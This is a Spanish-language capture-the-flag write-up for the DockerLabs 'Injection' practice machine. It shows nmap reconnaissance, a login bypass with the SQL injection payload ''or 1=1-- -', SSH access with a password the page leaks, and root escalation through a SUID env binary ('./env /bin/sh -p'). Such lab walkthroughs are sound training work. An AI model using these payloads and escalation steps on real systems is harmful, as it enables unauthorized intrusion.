---
layout: ../../layouts/MarkdownWriteupLayout.astro
name: "Máquina Injection"
url: "writeups/Injetion"
difficulty: "Muy Fácil"
logo: "https://www.dockerlabs.es/images/logos/logo.png"
oficial: "https://www.dockerlabs.es/"
platform: "DockerLabs"
vulnerabilities: ["SQL Injection"]
inProgress: false
title: "Injection"
date: "07-09-2024"
---

<!-- Espaciado superior -->
<article
  class="mt-16 mr-8 ml-8 text-black dark:text-white justify-center items-center"
>
  <h1 class="text-2xl font-bold mb-4 text-black dark:text-white">
    Descripción
  </h1>

  <p class="mb-6">
    En este writeup se describe el proceso para explotar una vulnerabilidad
    comun y sensilla de SQL Injection en la máquina Injection del entorno de
    pruebas. Se incluyen detalles sobre la configuración, las herramientas
    utilizadas y los pasos seguidos para lograr el objetivo.
  </p>

  <h2 class="text-2xl font-bold mb-4 text-black dark:text-white">
    Paso 1: Reconocimiento
  </h2>

  <p class="mb-6">
    Se realizó un escaneo inicial para identificar los servicios en ejecución y
    las posibles vulnerabilidades.
  </p>

  <ul class="list-disc pl-5 mb-6 text-black dark:text-white">
    <li>
      <strong class="text-black dark:text-white">Herramienta utilizada</strong>:
      Nmap
    </li>
    <li>
      <strong class="text-black dark:text-white">Comando</strong>: <code
        class="bg-gray-200 px-2 py-1 rounded"
        >nmap -sCV -sS -n -Pn -p- 172.17.0.2</code
      >
    </li>
    <li>
      <strong class="text-black dark:text-white">Puertos abiertos</strong>: 22 y
      80
    </li>
  </ul>

  <h2 class="text-2xl font-bold mb-4 text-black dark:text-white">
    Paso 2: Explotación
  </h2>
  <p class="mb-6">
    Ponemos la ip de la máquina en el navegador para poder observar la página.
    Intentamos iniciar sesión con las credenciales por default como admin:admin,
    root:root, root:admin. Al probar y no tener éxito al iniciar sesión,
    realizamos pruebas de <strong class="text-black dark:text-white"
      >Injection SQL</strong
    >.
  </p>
  <ul class="list-disc pl-5 mb-6">
    <li>
      <strong class="text-black dark:text-white">Comando SQL</strong>: <code
        class="bg-gray-200 px-2 py-1 rounded"
        >'or 1=1-- -
      </code>
    </li>
  </ul>
  <p class="mb-6">En el caso de la contraseña ponemos una aleatoria.</p>
  <img
    class="rounded-xl"
    src="/labs/injection/login.png"
    alt="login de 172.17.0.2"
  />

  <p class="mb-6">
    Determinamos que funciono correctamente y tenemos un inicio de sesón
    exitoso.
  </p>

<img
    class="rounded-xl"
    src="/labs/injection/home.png"
    alt="home de 172.17.0.2"
  />

  <h2 class="text-2xl font-bold mb-4 text-black dark:text-white">
    Paso 3: Acceso al servidor
  </h2>

  <p class="mb-6">
    Una vez explotada la vulnerabilidad. tratamos de acceder al servidor
  </p>

  <ul class="list-disc pl-5 mb-6">
    <li><strong class="text-black dark:text-white">Conexión</strong>: SSH</li>
    <li>
      <strong class="text-black dark:text-white">Comando</strong>: <code
        class="bg-gray-200 px-2 py-1 rounded">ssh dylan@172.17.0.2</code
      >
    </li>
  </ul>

  <p class="mb-6">
    Pegamos la contraseña que nos dio el home de la página: <strong
      class="text-black dark:text-white">KJSDFG789FGSDF78</strong
    >
  </p>

  <h2 class="text-2xl font-bold mb-4 text-black dark:text-white">
    Paso 4. Escalada de privilegios
  </h2>

  <p class="mb-6">
    Hemos accedido al servidor por medio de SSH, ahora tenemos que escalar
    privilegios.
  </p>

  <p class="mb-6">Buscamos binarios que se ejecuten como sudo:</p>
  <code class="bg-gray-200 px-2 py-1 rounded">sudo -l</code>
  <p class="mb-6">
    Nos devolberá este error:<code class="bg-gray-200 px-2 py-1 rounded"
      >-bash: sudo: command not found
    </code>
  </p>
  <p class="mb-6">Por lo que buscaremos con permisos de suid 4000:</p>
  <code class="bg-gray-200 px-2 py-1 rounded"
    >find / -perm -4000 2>/dev/null></code
  >
  <p class="mb-6">Al ejecutar el comando nos mostrarará lo siguiente:</p>

  <pre
    class="bg-gray-200 rounded text-black">
<code class="language-python">
/usr/bin/gpasswd
/usr/bin/env
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
</code>
  </pre>

  <p class="mb-6">Observamos que podemos usar /env, por lo que accedemos a su carpeta /usr/bin/:</p>

<p class="mb-6">Ejecutamos para escalar privilegios: <code class="bg-gray-200 px-2 py-1 rounded">./env /bin/sh -p
</code></p>

<h2 class="text-2xl font-bold mb-4 text-black dark:text-white">Máquina resuelta</h2>
 <p class="mb-6">Ya hemos escalado privilegios:</p>
  <pre
    class="bg-gray-200 p-4 rounded text-black">
<code class="language-python">
whoami
-----
root
</code>
  </pre>

</article>